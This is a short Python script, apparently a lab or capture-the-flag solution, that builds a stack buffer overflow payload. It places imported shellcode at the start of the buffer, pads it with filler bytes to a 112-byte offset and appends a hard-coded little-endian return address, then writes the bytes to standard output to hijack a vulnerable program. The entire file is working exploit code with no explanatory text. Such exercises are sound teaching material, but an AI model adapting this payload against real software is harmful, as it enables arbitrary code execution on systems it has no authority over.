from shellcode import shellcode
import sys
offset = 112-len(shellcode)
target_addr = 0xfff69fec
user_input = b"a" * offset
user_input += target_addr.to_bytes(4, "little")
final = shellcode + user_input
sys.stdout.buffer.write(final)